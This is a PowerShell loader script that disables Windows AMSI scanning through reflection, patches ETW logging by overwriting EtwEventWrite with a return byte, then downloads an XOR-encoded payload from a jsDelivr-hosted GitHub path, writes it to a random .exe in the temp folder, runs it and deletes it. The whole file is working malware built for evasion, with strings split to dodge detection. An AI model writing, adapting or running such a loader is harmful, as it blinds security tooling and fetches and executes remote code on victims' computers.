# runtime.ps1 — AMSI patch + native PE loader

# ---------- AMSI patch ----------
try {
    $t = [Ref].Assembly.GetType(('System.Management.Automation.' + 'AmsiUtils'))
    $f = $t.GetField(('amsi' + 'InitFailed'), 'NonPublic,Static')
    $f.SetValue($null, $true)
} catch {}

# ---------- ETW patch ----------
try {
    $ntdll = [System.Runtime.InteropServices.Marshal]::GetModuleHandle('ntdll.dll')
    $etw = [System.Runtime.InteropServices.Marshal]::GetProcAddress($ntdll, 'Etw' + 'EventWrite')
    [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, $etw, 1)
} catch {}

# ---------- payload loader ----------
$url = "https://cdn.jsdelivr.net/gh/beamer123q-svg/update-test@main/assets.dat"
$key = [byte[]](0x5A,0x5B,0x5C,0x5D)

try {
    $bytes = (New-Object Net.WebClient).DownloadData($url)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
    }

    $tmp = "$env:TEMP\" + [System.IO.Path]::GetRandomFileName() + ".exe"
    [System.IO.File]::WriteAllBytes($tmp, $bytes)
    Start-Process -FilePath $tmp
    Start-Sleep -Seconds 3
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
} catch {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show("LOADER FAILED: $_", "Test")
}
